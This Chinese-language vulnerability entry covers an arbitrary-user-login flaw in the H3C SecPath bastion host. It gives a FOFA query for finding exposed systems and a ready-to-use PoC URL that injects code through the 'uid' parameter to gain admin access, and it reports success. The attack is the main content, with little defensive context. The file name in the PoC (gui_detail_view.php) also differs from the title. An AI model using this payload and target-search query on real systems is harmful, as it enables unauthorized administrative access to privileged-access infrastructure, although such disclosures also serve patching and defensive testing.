# H3C SecParh堡垒机 get_detail_view.php 任意用户登录漏洞

## 漏洞描述

H3C SecParh堡垒机 get_detail_view.php 存在任意用户登录漏洞

与齐治堡垒机出现的漏洞相似

## 漏洞影响

> [!NOTE]
>
> H3C SecParh堡垒机 

## FOFA

> [!NOTE]
>
> app="H3C-SecPath-运维审计系统" && body="2018"

## 漏洞复现

登录页面如下

![image-20210616132951212](http://wikioss.peiqi.tech/vuln/image-20210616132951212.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

POC验证的Url为

```
/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
```

![](http://wikioss.peiqi.tech/vuln/h3c-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

成功获取admin权限

## Goby & POC

![](http://wikioss.peiqi.tech/vuln/h3c-5.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)